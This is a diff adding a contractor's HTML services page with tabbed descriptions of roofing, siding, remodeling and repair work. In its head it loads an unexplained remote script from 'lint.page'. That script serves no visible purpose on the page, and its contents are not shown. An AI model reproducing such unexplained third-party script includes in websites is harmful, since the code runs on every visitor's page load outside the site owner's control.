@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>T&amp;O Construction Services | Roofing, Remodeling, Repairs</title>
+    <link rel="stylesheet" href="assets/css/services.css">
+    <link rel="stylesheet" href="https://code.jquery.com/ui/1.13.2/themes/base/jquery-ui.css">
+    <script src="../../../scripts/html-include.js" defer></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://code.jquery.com/ui/1.13.2/jquery-ui.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            $('#service-tabs').tabs();
+        });
+    </script>
+    <script src="https://lint.page/kit/4d0fe3.js" crossorigin="anonymous"></script>
+</head>
+<body>
+    <header data-include="../components/header.html"></header>
+
+    <div class="site-wrapper">
+        <main>
+            <!-- Service overview hero -->
+            <section class="services-hero" aria-labelledby="services-heading">
+                <p class="kicker">Trusted by Charlotte homeowners</p>
+                <h1 id="services-heading" class="service-title">Comprehensive exterior and interior services</h1>
+                <p>
+                    Every project begins with a walkthrough and a clear scope of work. Explore the categories below to see
+                    how T&amp;O handles roofing, siding, remodeling, and custom repair projects for properties across the Queen City.
+                </p>
+            </section>
+
+            <!-- jQuery UI tabs for service categories -->
+            <section class="service-tabs" aria-label="Service categories">
+                <div id="service-tabs">
+                    <ul>
+                        <li><a href="#tab-roofing">Roofing</a></li>
+                        <li><a href="#tab-siding">Siding</a></li>
+                        <li><a href="#tab-exterior">Exterior Remodeling</a></li>
+                        <li><a href="#tab-interior">Interior Remodeling</a></li>
+                        <li><a href="#tab-other">General Repairs &amp; Other</a></li>
+                    </ul>
+
+                    <div id="tab-roofing">
+                        <article>
+                            <h2 class="tab-title">Roofing</h2>
+                            <p>
+                                Asphalt shingle replacements, metal panel installations, leak mitigation, and storm damage repairs.
+                                We work with Owens Corning, GAF, and premium fasteners for long-term durability. Clean job sites and
+                                clear communication are part of every scope.
+                            </p>
+                            <ul>
+                                <li>Full tear-offs, re-decks, and ventilation upgrades.</li>
+                                <li>Insurance coordination with photo documentation.</li>
+                                <li>Preventative maintenance packages for HOAs and property managers.</li>
+                            </ul>
+                            <a class="inline-link" href="../projects-page/index.html">See roofing projects</a>
+                        </article>
+                    </div>
+
+                    <div id="tab-siding">
+                        <article>
+                            <h2 class="tab-title">Siding</h2>
+                            <p>
+                                Fiber cement, LP SmartSide, board-and-batten, and cedar accents finished with weather wrap
+                                systems. Precision flashing and trim ensure tight building envelopes and design consistency.
+                            </p>
+                            <ul>
+                                <li>Full-house re-siding and selective repairs.</li>
+                                <li>Custom color consultations with paint partners.</li>
+                                <li>Window and door trim packages that modernize elevations.</li>
+                            </ul>
+                            <a class="inline-link" href="../projects-page/index.html">See siding projects</a>
+                        </article>
+                    </div>
+
+                    <div id="tab-exterior">
+                        <article>
+                            <h2 class="tab-title">Exterior remodeling</h2>
+                            <p>
+                                From front porches to backyard decks, we reimagine outdoor spaces to add curb appeal and function.
+                                Pergolas, screened rooms, and entry redesigns are planned with weather-ready materials.
+                            </p>
+                            <ul>
+                                <li>Porch expansions, railing upgrades, and composite decking.</li>
+                                <li>Outdoor kitchens, fireplaces, and lighting coordination.</li>
+                                <li>Water management, gutters, and grading improvements.</li>
+                            </ul>
+                            <a class="inline-link" href="../projects-page/index.html">See exterior remodels</a>
+                        </article>
+                    </div>
+
+                    <div id="tab-interior">
+                        <article>
+                            <h2 class="tab-title">Interior remodeling</h2>
+                            <p>
+                                Kitchens, baths, basements, and trim carpentry that make indoor spaces flow with new layouts
+                                and finishes. We manage subtrades, scheduling, and inspections to keep projects on track.
+                            </p>
+                            <ul>
+                                <li>Cabinetry, countertops, and tile installations.</li>
+                                <li>Load-bearing wall removal with engineered beams.</li>
+                                <li>Custom built-ins, stair upgrades, and flooring transitions.</li>
+                            </ul>
+                            <a class="inline-link" href="../projects-page/index.html">See interior remodels</a>
+                        </article>
+                    </div>
+
+                    <div id="tab-other">
+                        <article>
+                            <h2 class="tab-title">General repairs &amp; other services</h2>
+                            <p>
+                                Not every job needs a full renovation. T&amp;O tackles punch lists, storm assessments,
+                                and small projects that keep your property secure between larger updates.
+                            </p>
+                            <ul>
+                                <li>Fascia, soffit, and gutter repairs.</li>
+                                <li>Door, window, and hardware replacements.</li>
+                                <li>Emergency tarping and moisture intrusion mitigation.</li>
+                            </ul>
+                            <a class="inline-link" href="../contact-page/index.html">Request a repair walk-through</a>
+                        </article>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Lead capture call-to-action -->
+            <section class="cta-banner" aria-label="Ready to start your project">
+                <div>
+                    <h2 class="cta-heading">Ready for an estimate?</h2>
+                    <p>Share the scope and timeline so we can prepare a detailed proposal tailored to your property.</p>
+                </div>
+                <a class="btn btn-primary" href="../contact-page/index.html">Contact T&amp;O</a>
+            </section>
+        </main>
+    </div>
+
+    <footer data-include="../components/footer.html"></footer>
+</body>
+</html>
